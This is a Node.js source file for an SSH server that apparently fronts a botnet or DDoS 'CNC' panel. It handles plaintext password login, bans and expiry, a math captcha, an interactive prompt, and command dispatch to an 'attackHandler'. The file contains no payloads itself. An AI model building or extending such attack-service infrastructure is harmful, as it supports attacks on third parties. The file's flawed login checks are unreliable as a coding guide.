const path = require('path');
const fs = require('fs');
const { Server } = require('ssh2');

if (typeof __dirname === 'undefined')
{
    global.__dirname = path.resolve();
}

eval(fs.readFileSync(path.join(__dirname, './utils/LogUtils.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './handlers/CommandHandler.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/UserUtils.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/PageUtils.js'), 'utf8'));

const HostKey = fs.readFileSync(path.join(__dirname, './keys/host.key'));

async function startSSHServer(config, db, attackHandler) 
{
    const activeSessions = new Map();

    let server = new Server(
    {
        hostKeys: [HostKey],
        keepaliveInterval: 30 * 1000, 
        banner: config?.banner_message || 'Welcome',
    }, async (client) => 
    { 
        let _user = null;
        let _existingSessionId = null;
        let _pauseRef = { value: false };
        const rawIp = client._sock.remoteAddress;
        const clientIP = rawIp.startsWith('::ffff:') ? rawIp.slice(7) : rawIp;
        const sessionId = `${Date.now()}_${Math.random().toString(36).substring(2, 10)}`;

        const cleanupSession = () => 
        {
            const session = activeSessions.get(sessionId);
            if (session?.intervals) 
            {
                for (const interval of session.intervals) 
                {
                    clearInterval(interval);
                }
            }
            activeSessions.delete(sessionId);
        };

        client.on('authentication', async (ctx) => 
        {
            if (ctx.method !== 'password')
            {
            return ctx.reject(['password']);
            }
            const username = ctx.username;
            const user = await db.findDocumentByKey('username', username.toLowerCase(), config.mongo_db_collection);
            if (user && user.password === ctx.password) 
            {
                if (await globalThis.isUserExpired(config, db, user)) 
                {
                    globalThis.logToFile(globalThis.LogPaths.LoginAttempts,  `FAILED - ${username} - Account expired`);
                    return ctx.reject(['password'], false, 
                    {
                        message: 'Your account has expired. Contact support.'
                    });
                }
                if (user.banned) 
                {
                    globalThis.logToFile(globalThis.LogPaths.LoginAttempts,  `FAILED - ${username} - Account banned`);
                    ctx.reject(['password'], false, 
                    {
                        message: '\x1b[31mYour account has been banned. Access denied.\x1b[0m'
                    });
                }
                _existingSessionId = [...activeSessions.entries()].find(([_, session]) => session.user.username === username)?.[0];
                globalThis.logToFile(globalThis.LogPaths.LoginAttempts, `SUCCESS - ${username} - IP: ${clientIP} - SessionID: ${sessionId}`);
                _user = user;
                _user.username = _user.username.toLowerCase();
                activeSessions.set(sessionId, { user, client, stream: null, intervals: []  });
                return ctx.accept();
            } 
            else
            {
                globalThis.logToFile(globalThis.LogPaths.LoginAttempts, `FAILED - ${username} - Invalid credentials`);
                return ctx.reject();
            }
        });

        client.on('ready', async () => 
        {
            client.on('session', async (accept) => 
            {
                const session = accept();
                session.on('pty', async (accept) => 
                {
                    accept({ term: 'xterm-256color', rows: 24, cols: 80 });
                });
                session.on('shell', async (accept) => 
                {
                    const stream = accept();
                    
                    if (config.ssh.captcha_enabled)   
                    {  
                        let captchaPassed = false; 
                        let attempts = 0;
                        const maxAttempts = 3;
                
                        const a = Math.floor(Math.random() * 10) + 1;
                        const b = Math.floor(Math.random() * 10) + 1;
                        const captchaAnswer = (a + b).toString();
                
                        stream.write('\x1B[2J\x1B[H');
                        stream.write('\x1b[33m[!] Verification Required\x1b[0m\r\n');
                        stream.write(`\x1b[36mSolve this to continue: What is ${a} + ${b}?\x1b[0m\r\n`);
                        stream.write('\x1b[97mAnswer: \x1b[0m');
                
                        let captchaBuffer = '';
                
                        const handleCaptchaInput = (chunk) => 
                        {
                            const input = chunk.toString('utf-8');
                
                            if (input.startsWith('\x1b')) 
                            {
                                return; 
                            }
                
                            if (input === '\r' || input === '\n') 
                            {
                                stream.write('\r\n');
                                if (captchaBuffer.trim() === captchaAnswer) 
                                {
                                    globalThis.logToFile(globalThis.LogPaths.CaptchaLogs, `CAPTCHA PASS - ${_user?.username || 'Unknown'} - IP: ${clientIP} - SessionID: ${sessionId}`);
                                    captchaPassed = true;
                                    stream.removeListener('data', handleCaptchaInput);
                                    stream.write('\x1b[32mCorrect! Access granted.\x1b[0m\r\n');
                                    setTimeout(() =>
                                    {
                                        stream.write('\x1B[2J\x1B[H');
                                        continueShell(); 
                                    }, 500);
                                } 
                                else
                                {
                                    attempts++;
                                    if (attempts >= maxAttempts) 
                                    {
                                        globalThis.logToFile(globalThis.LogPaths.CaptchaLogs, `CAPTCHA FAIL - ${_user?.username || 'Unknown'} - IP: ${clientIP} - SessionID: ${sessionId}`);
                                        stream.write('\x1b[31m[-] Too many incorrect answers. Connection closed.\x1b[0m\r\n');
                                        stream.end();
                                        client.end();
                                    } 
                                    else
                                    {
                                        captchaBuffer = '';
                                        stream.write(`\x1b[31m[!] Incorrect. Try again (${maxAttempts - attempts} tries left)\x1b[0m\r\n`);
                                        stream.write('\x1b[97mAnswer: \x1b[0m');
                                    }
                                }
                                return;
                            }
                
                            if (input === '\x7f' || input === '\b') 
                            {
                                if (captchaBuffer.length > 0) 
                                {
                                    captchaBuffer = captchaBuffer.slice(0, -1);
                                    stream.write('\b \b');
                                }
                            } 
                            else
                            {
                                captchaBuffer += input;
                                stream.write(input);
                            }
                        };
                        stream.on('data', handleCaptchaInput);
                    }
                    else
                    {
                    continueShell();
                    }
                    
                    function continueShell() 
                    {
                        let pageContents = globalThis.loadPages(config);
                    
                        activeSessions.get(sessionId).stream = stream;
                        stream.write('\x1B[2J\x1B[H');
                    
                        let buffer = '', cursorPosition = 0, historyIndex = -1;
                        let commandHistory = [];
                        let lastDrawnLengthRef = { value: 0 };
                        let rawPrompt = globalThis.replaceCNCname(
                            globalThis.replaceUsername(pageContents.prompt.trimEnd(), _user),
                            config.cnc_name
                        );
                        let promptLines = rawPrompt.split(/\r?\n/);
                        let promptText = promptLines[promptLines.length - 1];
                        let promptLength = globalThis.stripAnsi(promptText).length;
                    
                        const titleInterval = setInterval(() => 
                        {
                            const dedupedSessions = new Map();
                            for (const session of activeSessions.values()) 
                            {
                                if (session?.user?.username) 
                                {
                                    dedupedSessions.set(session.user.username, session);
                                }
                            }
                            try 
                            {
                                stream.write(`\x1b]0;${globalThis.replaceTitle(pageContents.title, config, dedupedSessions, attackHandler, _user)}\x07`);
                            } 
                            catch (err) 
                            {
                                console.error(`[Interval Error] Failed to write title: ${err.message}`);
                            }
                        }, 1000);
                    
                        const userInterval = setInterval(async () => 
                        {
                            pageContents = globalThis.loadPages(config);
                            _user = await db.findDocumentByKey('username', _user.username.toLowerCase(), config.mongo_db_collection);
                            _user.username = _user.username.toLowerCase();
                            rawPrompt = globalThis.replaceCNCname(
                                globalThis.replaceUsername(pageContents.prompt.trimEnd(), _user),
                                config.cnc_name
                            );
                            promptLines = rawPrompt.split(/\r?\n/);
                            promptText = promptLines[promptLines.length - 1];
                            promptLength = globalThis.stripAnsi(promptText).length;
                            const session = activeSessions.get(sessionId);
                            if (session) 
                            {
                                session.user = _user;
                            } 
                            else 
                            {
                                console.warn(`Session with ID ${sessionId} not found in activeSessions.`);
                                clearInterval(userInterval);
                            }
                        }, 5000);
                    
                        activeSessions.get(sessionId).intervals.push(titleInterval);
                        activeSessions.get(sessionId).intervals.push(userInterval);
                    
                        if (_existingSessionId) 
                        {
                            buffer = '';
                            cursorPosition = 0;
                            stream.write('\x1B[2J\x1B[H');
                            stream.write(`\x1b[31m[!] You are already logged in elsewhere.\x1b[0m\r\n`);
                            stream.write(`\x1b[97mDo you want to close your previous session and continue here? (yes/no)\x1b[0m\r\n`);
                            if (promptLines.length > 1) 
                            {
                                for (let i = 0; i < promptLines.length - 1; ++i) 
                                {
                                    stream.write(promptLines[i] + '\n');
                                }
                            }
                            stream.write(`\r${promptText}`);
                            lastDrawnLengthRef.value = 0;
                        } 
                        else if (pageContents.home) 
                        {
                            stream.write('\x1B[2J\x1B[H');
                            stream.write(globalThis.replaceUsername(pageContents.home, _user));
                            if (promptLines.length > 1) 
                            {
                                for (let i = 0; i < promptLines.length - 1; ++i) 
                                {
                                    stream.write(promptLines[i] + '\n');
                                }
                            }
                            stream.write(`\r${promptText}`);
                            lastDrawnLengthRef.value = 0;
                        }
                        stream.on('data', async (data) => 
                        {
                            if (_pauseRef.value === true) 
                            {
                                return;
                            }
                
                            const input = data.toString('utf-8');
                            if (input.startsWith('\x1b')) 
                            {
                                if (input === '\x1b[A') 
                                {
                                    if (commandHistory.length > 0 && historyIndex < commandHistory.length - 1) 
                                    {
                                        historyIndex++;
                                        buffer = commandHistory[commandHistory.length - 1 - historyIndex];
                                        cursorPosition = buffer.length;
                                        globalThis.redrawInline(stream, buffer, cursorPosition, promptLength, lastDrawnLengthRef);
                                    }
                                } 
                                else if (input === '\x1b[B') 
                                {
                                    if (historyIndex > 0) 
                                    {
                                        historyIndex--;
                                        buffer = commandHistory[commandHistory.length - 1 - historyIndex];
                                    } 
                                    else
                                    {
                                        historyIndex = -1;
                                        buffer = '';
                                    }
                                    cursorPosition = buffer.length;
                                    globalThis.redrawInline(stream, buffer, cursorPosition, promptLength, lastDrawnLengthRef);
                                } 
                                else if (input === '\x1b[D' && cursorPosition > 0) 
                                {
                                    cursorPosition--;
                                    stream.write('\x1b[D');
                                } 
                                else if (input === '\x1b[C' && cursorPosition < buffer.length) 
                                {
                                    cursorPosition++;
                                    stream.write('\x1b[C');
                                }
                                return;
                            }
                    
                            if (input === '\r' || input === '\n') 
                            {
                                stream.write('\r\n');
                                const cleanInput = buffer.trim();
                                if (cleanInput) commandHistory.push(cleanInput);
                                historyIndex = -1;
                                if (_existingSessionId) 
                                {
                                    if (['yes', 'y'].includes(cleanInput.toLowerCase())) 
                                    {
                                        const oldClient = activeSessions.get(_existingSessionId)?.client;
                                        if (oldClient) oldClient.end();
                                        activeSessions.delete(_existingSessionId);
                                        _existingSessionId = null;
                                        stream.write(`\x1b[32mOld session closed. Redirecting...\x1b[0m\r\n`);
                                        setTimeout(() =>
                                        {
                                            stream.write('\x1B[2J\x1B[H');
                                            stream.write(replaceUsername(pageContents.home, _user));
                                            stream.write(`\r${promptText}`);
                                            lastDrawnLengthRef.value = 0;
                                        }, 1000);
                                    } 
                                    else 
                                    {
                                        stream.write('\x1b[31m[-] Session aborted.\x1b[0m\r\n');
                                        stream.end();
                                        client.end();
                                    }
                                } 
                                else 
                                {
                                    const [command, ...params] = cleanInput.split(' ');
                                    const CMD_OBJ = 
                                    { 
                                        command: command.toLowerCase(),
                                        params, 
                                        client, 
                                        stream, 
                                        pageContents,
                                        user: _user, 
                                        attackHandler, 
                                        db, 
                                        config, 
                                        activeSessions, 
                                        pauseRef: _pauseRef
                                    };
                                    await globalThis.HandleCommands(CMD_OBJ);
                                }
                                buffer = '';
                                cursorPosition = 0;
                                if (promptLines.length > 1) 
                                {
                                    for (let i = 0; i < promptLines.length - 1; ++i) 
                                    {
                                        stream.write(promptLines[i] + '\n');
                                    }
                                }
                                stream.write(`\r${promptText}`);
                                lastDrawnLengthRef.value = 0;
                                return;
                            }
                            if (input === '\x7f' || input === '\b') 
                            {
                                if (cursorPosition > 0) 
                                {
                                    buffer = buffer.slice(0, cursorPosition - 1) + buffer.slice(cursorPosition);
                                    cursorPosition--;
                                    globalThis.redrawInline(stream, buffer, cursorPosition, promptLength, lastDrawnLengthRef);
                                }
                                return;
                            }
                            buffer = buffer.slice(0, cursorPosition) + input + buffer.slice(cursorPosition);
                            cursorPosition += input.length;
                            globalThis.redrawInline(stream, buffer, cursorPosition, promptLength, lastDrawnLengthRef);
                        });
                    }
                    stream.on('end', cleanupSession);
                });
            });
        });
        client.on('end', cleanupSession);
        client.on('close', cleanupSession);
        client.on('disconnect', cleanupSession);
        client.on('error', (err) => 
        {
            if (err.code !== 'ECONNRESET')
            {
                console.error(`[SSH ERROR] Client IP: ${clientIP}, SessionID: ${sessionId}, Error: ${err.code} - ${err.message}`);
            }
            cleanupSession();
        });
    });

    server.listen(config.ssh.port, '0.0.0.0', () => 
    {
        console.log(`SSH server listening on port ${config.ssh.port}`);
    });
}

globalThis.startSSHServer = startSSHServer;